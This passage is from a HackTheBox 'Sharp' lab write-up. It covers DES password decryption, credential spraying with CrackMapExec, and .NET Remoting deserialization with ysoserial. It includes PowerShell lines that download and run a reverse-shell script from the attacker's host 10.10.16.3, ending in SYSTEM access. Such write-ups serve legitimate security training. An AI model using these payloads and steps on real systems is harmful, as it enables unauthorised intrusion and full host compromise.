decrypt method. The <code class="language-plaintext highlighter-rouge">Decrypt</code> function reads encrypted string as input, then uses <code class="language-plaintext highlighter-rouge">DESCryptoServiceProvider</code> with hardcoded key and IV to decrypt our string.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-21.png" alt="Crypto.Decrypt" /></p><p>On line 62 and 65, from two magic bytes called <code class="language-plaintext highlighter-rouge">_rgbKey</code> and <code class="language-plaintext highlighter-rouge">_rgbIV</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>		// Token: 0x04000001 RID: 1		private static byte[] _rgbKey = Encoding.ASCII.GetBytes("7ly6UznJ"); // Hex: 376c7936557a6e4a		// Token: 0x04000002 RID: 2		private static byte[] _rgbIV = Encoding.ASCII.GetBytes("XuVUm5fR");	// Hex: 587556556d356652
</pre></table></code></div></div><p>Talk a little about DES cipher, people use two common mode which are CBC (<strong>cipher block chaining</strong>) and ECB (<strong>electronic code book</strong>). But only CBC supports key and IV in combination to generate the block cipher.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png" alt="Source: Wikipedia" /></p><p>So we are able to decrypt the password using <a href="https://gchq.github.io/CyberChef/">CyberChef</a> with the following recipe will give us our plain password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-32.png" alt="" /></p><h3 id="credentials-spraying-with-cme">Credentials spraying with CME</h3><p>In this step, we will correspondingly put our usernames and passwords in two separate text file and let CME do the verification job for us.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c"># users.txt                   larsAdministrator                                                                                                    # passwords.txt G123HHrth234gRGG2@$btRSHJYTarg┌──(root💀kali)-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219 -u ../../users.txt -p ../../passwords.txt SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG </span>
</pre></table></code></div></div><p>Only <code class="language-plaintext highlighter-rouge">lars</code> can log in so we should excluded Administrator credentials for now.</p><h3 id="credentials-acquired">Credentials acquired</h3><div class="table-wrapper"><table><thead><tr><th>Username<th>Password<th>Status<tbody><tr><td>Administrator<td>G2@$btRSHJYTarg<td>Invalid<tr><td>lars<td>G123HHrth234gRG<td>Valid</table></div><h2 id="user-level-access">User-level access</h2><p>After using <code class="language-plaintext highlighter-rouge">lars</code> credentials, we are able to crawl his shared-objects with <code class="language-plaintext highlighter-rouge">spider_plus</code> module as following:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>                                                                                                    ┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/HackTheBox/Sharp/opt/CrackMapExec]└─# poetry run crackmapexec.spec smb 10.10.10.219 <span class="nt">-u</span> lars <span class="nt">-p</span> G123HHrth234gRG <span class="nt">-M</span> spider_plus     2 ⨯SMB         10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SHARP<span class="o">)</span> <span class="o">(</span>domain:Sharp<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>SMB         10.10.10.219    445    SHARP            <span class="o">[</span>+] Sharp<span class="se">\l</span>ars:G123HHrth234gRG SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started spidering plus with option:SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>        DIR: <span class="o">[</span><span class="s1">'print$'</span><span class="o">]</span>SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>        EXT: <span class="o">[</span><span class="s1">'ico'</span>, <span class="s1">'lnk'</span><span class="o">]</span>SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>       SIZE: 51200SPIDER_P... 10.10.10.219    445    SHARP            <span class="o">[</span><span class="k">*</span><span class="o">]</span>     OUTPUT: /tmp/cme_spider_plus
</pre></table></code></div></div><p>We made the <code class="language-plaintext highlighter-rouge">.json</code> more readable by filtering out the time and file size.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>                                                                                                    ┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/kali/HackTheBox/Sharp]└─# <span class="nb">cat </span>10.10.10.219_lars_spider.json | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'time\|size'</span> | <span class="nb">grep</span> <span class="s1">': {'</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="se">\"</span> <span class="s1">'{print $2}'</span>  IPC<span class="nv">$	</span>		<span class="c"># directoryInitShutdownLSM_API_servicePIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDERPSHost.132655164003465770.3392.DefaultAppDomain.powershellW32TIME_ALTWinsock2\\CatalogChangeListener-154-0Winsock2\\CatalogChangeListener-1dc-0Winsock2\\CatalogChangeListener-268-0Winsock2\\CatalogChangeListener-274-0Winsock2\\CatalogChangeListener-36c-0Winsock2\\CatalogChangeListener-42c-0atsvcepmappereventloglsassntsvcsscerpcsrvsvcvgauth-servicewkssvcdev				# directoryClient.exeRemotingLibrary.dllServer.exenotes.txt</span>
</pre></table></code></div></div><p>While searching <code class="language-plaintext highlighter-rouge">lars</code> files, only those in <code class="language-plaintext highlighter-rouge">\\dev</code> seem important.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/HackTheBox/Sharp/smb/lars]└─# smbclient <span class="nt">-U</span> <span class="s1">'lars'</span> //10.10.10.219/dev G123HHrth234gRG                                    130 ⨯Try <span class="s2">"help"</span> to get a list of possible commands.smb: <span class="se">\&gt;</span> <span class="nb">ls</span>  <span class="nb">.</span>                                   D        0  Sun Nov 15 06:30:13 2020  ..                                  D        0  Sun Nov 15 06:30:13 2020  Client.exe                          A     5632  Sun Nov 15 05:25:01 2020  notes.txt                           A       70  Sun Nov 15 08:59:02 2020  RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020  Server.exe                          A     6144  Mon Nov 16 06:55:44 2020  <span class="c"># notes.txtTodo:    Migrate from .Net remoting to WCF	# This might be our hint    Add input validation</span>
</pre></table></code></div></div><p>Two executables <code class="language-plaintext highlighter-rouge">Client.exe</code> and <code class="language-plaintext highlighter-rouge">Server.exe</code>, as well as their library, are also built in C# so we can decompile them with dnSpy.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-02.png" alt="" /></p><p>Then we have a <em>secret</em> endpoint listening on port <code class="language-plaintext highlighter-rouge">8888</code> with its username and password hardcoded in <code class="language-plaintext highlighter-rouge">Client.exe</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-06.png" alt="Client.exe" /></p><p>The credentials are to be tested with CME whether they are valid.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-12.png" alt="" /></p><h3 id="credentials-acquired-1">Credentials acquired</h3><div class="table-wrapper"><table><thead><tr><th>Username<th>Password<th>Status<tbody><tr><td>debug<td>SharpApplicationDebugUserPassword123!<td>Valid<tr><td>Administrator<td>G2@$btRSHJYTarg<td>Invalid<tr><td>lars<td>G123HHrth234gRG<td>Valid</table></div><h2 id="exploit-local-net-debug-service">Exploit local .NET debug service</h2><p>As <code class="language-plaintext highlighter-rouge">debug</code> profile contains nothing but some useless folders (<code class="language-plaintext highlighter-rouge">IPC$</code>, <code class="language-plaintext highlighter-rouge">dev</code> and similarities for lars), we have to figure out how to connect to the endpoint on port 8888. Back to the <code class="language-plaintext highlighter-rouge">notes.txt</code>, I thought there is something to do with the .NET service and came across these two repos. You can take a look yourselves.</p><p>https://github.com/tyranid/ExploitRemotingService</p><blockquote><p>A tool to exploit .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149. It only works on Windows although some aspects <em>might</em> work in Mono on *nix.</p></blockquote><p>https://github.com/frohoff/ysoserial (basically our payload wrapper)</p><blockquote><p><strong>ysoserial</strong> is a collection of utilities and property-oriented programming “gadget chains” discovered in common java libraries that can, under the right conditions, exploit Java applications performing <strong>unsafe deserialization</strong> of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host</p></blockquote><p>We will use <em>ysoserial</em> to wrap our reverse-tcp PowerShell one-liner<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup> and call <em>ExploitRemotingService.exe</em> to pipe our wrapped payload into the mentioned vulnerable endpoint.</p><h3 id="payload-crafting-and-network-configuration">Payload crafting and Network configuration</h3><h4 id="useful-poc-repositories">Useful PoC<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote">2</a></sup> repositories</h4><p>Because ExploitRemotingService doesn’t provide us any release versions so we have to download and build the project manually with Visual Studio on our Windows VM<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote">3</a></sup>.</p><p>Additionally, I have to install <a href="http://www.ndesk.org/Options">NDesk Options</a> library in order to successfully compile the solution.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-27.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">ysoserial</code> has their portable version so we can simply download, unzip and use it.</p><p>Here is a brief look of <code class="language-plaintext highlighter-rouge">Server.exe</code> source code decompiled by dnSpy. The server is running on port <code class="language-plaintext highlighter-rouge">8888</code> with BinaryFormatter sink implemented. You can read about the details <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.remoting.channels.binaryserverformattersink?view=netframework-4.8">here</a>; simply put, we just need <code class="language-plaintext highlighter-rouge">ysoserial</code> to wrap our payload in BinaryFormatter mode.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-41.png" alt="" /></p><p>Below is our crafting steps with <code class="language-plaintext highlighter-rouge">ysoserial</code> and <code class="language-plaintext highlighter-rouge">ExploitRemotingService</code>:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c">### ysoserial.exeC:\Users\User\Desktop\ysoserial-1.34\Release&gt;ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell IEX(new-object net.webclient).downloadString('http://10.10.16.3/reverse.ps1')"# Breakdown-f Formatter as BinaryFormatter-g TypeConfuseDelegate gadget-o Base64 output-c Create a reverse connection back to our IP using Powershell one-liner called reverse.ps1IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/reverse.ps1')### ExploitRemotingService.exeC:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release&gt;ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw &lt;wrapped payload&gt;# Breakdown-s Pipe command input from stdin--user=debug &amp; --pass="SharpApplicationDebugUserPassword123!" our endpoint credentials</span><span class="w">
</span></pre></table></code></div></div><h4 id="network-re-routing-on-windows-and-linux">Network re-routing on Windows and Linux</h4><p>Before we can send our payload to target host, remember that currently our Linux machine is the only one can connect to HTB VPN, not our Windows. In order to establish a connection between Windows and HTB VPN, we have to do some routing.</p><p>The following section helps us turn Kali into a router and act as the gateway.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c"># Windows# We want to route any HTB connection to our Kali machine NAT-IP (192.168.157.133)C:\Windows\system32&gt;route add 10.10.10.0 mask 255.255.255.0 192.168.157.133 OK!#	----------------------------------------------# Linux# Enable IP Forwarding$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # Configurate iptables' rules to manage incomming packets# This rule forwards packets from HTB to our Windows machine# Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state$ iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT # Accept packets sending back from Windows machine# Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB$ iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT# Re-routing NAT from HTB machine back to Windows# Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy$ iptables -t nat -A POSTROUTING -s 192.168.157.0/24 -o tun0 -j MASQUERADE </span>
</pre></table></code></div></div><h3 id="powershell-reverse-connection">PowerShell Reverse Connection</h3><p>Finally, our Windows is able to send/receive packets from HTB machine through Kali.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_12-49.png" alt="" /></p><p>Now we can send our payload to target remote host and wait for our reverse shell.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c">### ExploitRemotingService.exeC:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release&gt;ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw &lt;wrapped payload&gt;</span>
</pre></table></code></div></div><p>After execute the above command, we has established a reverse PowerShell as user <code class="language-plaintext highlighter-rouge">lars</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_13-17.png" alt="" /></p><p>Browsing through <code class="language-plaintext highlighter-rouge">lars</code> directories, there is a <code class="language-plaintext highlighter-rouge">wcf</code> folder in Documents. This has also been mentioned in <code class="language-plaintext highlighter-rouge">notes.txt</code> about migrating the project from dotNET to WCF, so it might be the answer. Anyway, the machine’s user flag is located in <code class="language-plaintext highlighter-rouge">C:\Users\lars\Desktop\user.txt</code>.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="w">    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\lars\Documents\wcfMode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                  </span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                  </span><span class="nx">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="o">.</span><span class="nf">vs</span><span class="w">                                                                   </span><span class="nx">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Client</span><span class="w">                                                                </span><span class="nx">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">packages</span><span class="w">                                                              </span><span class="nx">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">RemotingLibrary</span><span class="w">                                                       </span><span class="nx">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:41</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Server</span><span class="w">                                                                </span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">  </span><span class="nx">12:47</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">2095</span><span class="w"> </span><span class="nx">wcf.sln</span><span class="w">                                                               </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\lars\Documents\wcf</span><span class="err">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>Let’s compress the wcf directory into <code class="language-plaintext highlighter-rouge">wcf.zip</code> then download it to our Linux shared directory</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-09.png" alt="" /></p><h3 id="another-secret-endpoint-and-flag">Another secret endpoint and …flag!</h3><p>It turns out <code class="language-plaintext highlighter-rouge">wcf.zip</code> is also a C# project with source code inside, we can put it in Visual Studio and view the source. There is another secret endpoint that is currently running on port 8889 of the remote host.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-22.png" alt="" /></p><p>Since we are in the same network with remote target, you can try change the IP to the machine (10.10.10.219) and run the code. But there is a problem.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-29.png" alt="" /></p><p>We can’t connect to our target because of invalid credentials. This program was meant to run as internal users of the remote host (like <code class="language-plaintext highlighter-rouge">lars</code> or <code class="language-plaintext highlighter-rouge">debug</code>). To impersonate <code class="language-plaintext highlighter-rouge">lars</code>, we will run our command-prompt with his net-username as following:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre># Also type lars password when promptedC:\Windows\system32&gt;runas /user:lars /netonly %ComSpec%
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-33.png" alt="" /></p><p>Now we are <code class="language-plaintext highlighter-rouge">lars</code> in his server, move to our malformed <code class="language-plaintext highlighter-rouge">wcf</code> project and run it again.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-36.png" alt="" /></p><p>Successfully executed as <code class="language-plaintext highlighter-rouge">lars</code>. Now we will use the project’s built-in function <code class="language-plaintext highlighter-rouge">InvokePowerShell</code> to escalate our privilege.</p><div class="language-c# highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>        <span class="k">public</span> <span class="kt">string</span> <span class="nf">InvokePowerShell</span><span class="p">(</span><span class="kt">string</span> <span class="n">scriptText</span><span class="p">)</span>        <span class="p">{</span>            <span class="n">Runspace</span> <span class="n">runspace</span> <span class="p">=</span> <span class="n">RunspaceFactory</span><span class="p">.</span><span class="nf">CreateRunspace</span><span class="p">();</span>            <span class="n">runspace</span><span class="p">.</span><span class="nf">Open</span><span class="p">();</span>            <span class="n">Pipeline</span> <span class="n">pipeline</span> <span class="p">=</span> <span class="n">runspace</span><span class="p">.</span><span class="nf">CreatePipeline</span><span class="p">();</span>            <span class="n">pipeline</span><span class="p">.</span><span class="n">Commands</span><span class="p">.</span><span class="nf">AddScript</span><span class="p">(</span><span class="n">scriptText</span><span class="p">);</span>            <span class="n">pipeline</span><span class="p">.</span><span class="n">Commands</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"Out-String"</span><span class="p">);</span>            <span class="n">Collection</span> <span class="p">&lt;</span><span class="n">PSObject</span><span class="p">&gt;</span> <span class="n">results</span> <span class="p">=</span> <span class="n">pipeline</span><span class="p">.</span><span class="nf">Invoke</span><span class="p">();</span>            <span class="n">runspace</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>            <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>            <span class="k">foreach</span> <span class="p">(</span><span class="n">PSObject</span> <span class="n">obj</span> <span class="k">in</span> <span class="n">results</span><span class="p">)</span>            <span class="p">{</span>                <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">AppendLine</span><span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="nf">ToString</span><span class="p">());</span>            <span class="p">}</span>            <span class="k">return</span> <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">ToString</span><span class="p">();</span>        <span class="p">}</span>    <span class="p">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Client.cs</code> is to be changed as below:</p><div class="language-c# highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">namespace</span> <span class="nn">Client</span> <span class="p">{</span>    <span class="k">public</span> <span class="k">class</span> <span class="nc">Client</span>    <span class="p">{</span>        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span> <span class="p">{</span>            <span class="n">ChannelFactory</span><span class="p">&lt;</span><span class="n">IWcfService</span><span class="p">&gt;</span> <span class="n">channelFactory</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ChannelFactory</span><span class="p">&lt;</span><span class="n">IWcfService</span><span class="p">&gt;(</span>                <span class="k">new</span> <span class="nf">NetTcpBinding</span><span class="p">(</span><span class="n">SecurityMode</span><span class="p">.</span><span class="n">Transport</span><span class="p">),</span><span class="s">"net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint"</span>            <span class="p">);</span>            <span class="n">IWcfService</span> <span class="n">client</span> <span class="p">=</span> <span class="n">channelFactory</span><span class="p">.</span><span class="nf">CreateChannel</span><span class="p">();</span>            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="nf">InvokePowerShell</span><span class="p">(</span><span class="s">"IEX(New-Object Net.WebClient).downloadString('10.10.16.3/reverse.ps1')"</span><span class="p">));</span>        <span class="p">}</span>    <span class="p">}</span>
</pre></table></code></div></div><p>Re-build the project then execute <code class="language-plaintext highlighter-rouge">Client.exe</code> as <code class="language-plaintext highlighter-rouge">lars</code> gives us our reverse shell as <code class="language-plaintext highlighter-rouge">nt-authority system</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-46.png" alt="" /></p><p>And the flag is located in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop\root.txt</code></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\Administratordir</span><span class="w">    </span><span class="nx">Directory:</span><span class="w"> </span><span class="nx">C:\Users\AdministratorMode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                   </span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                   </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">3D</span><span class="w"> </span><span class="nx">Objects</span><span class="w">                                                             </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Contacts</span><span class="w">                                                               </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:42</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Desktop</span><span class="w">                                                                </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:46</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Documents</span><span class="w">                                                              </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Downloads</span><span class="w">                                                              </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Favorites</span><span class="w">                                                              </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Links</span><span class="w">                                                                  </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Music</span><span class="w">                                                                  </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Pictures</span><span class="w">                                                               </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Saved</span><span class="w"> </span><span class="nx">Games</span><span class="w">                                                            </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Searches</span><span class="w">                                                               </span><span class="nx">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Videos</span><span class="w">                                                                 </span><span class="nx">cd</span><span class="w"> </span><span class="nx">Desktopdir</span><span class="w">    </span><span class="nx">Directory:</span><span class="w"> </span><span class="nx">C:\Users\Administrator\DesktopMode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                   </span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                   </span><span class="nt">-ar</span><span class="o">---</span><span class="w">        </span><span class="nx">5/14/2021</span><span class="w">   </span><span class="nx">6:02</span><span class="w"> </span><span class="nx">AM</span><span class="w">             </span><span class="nx">34</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">                                                               </span><span class="nx">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> 
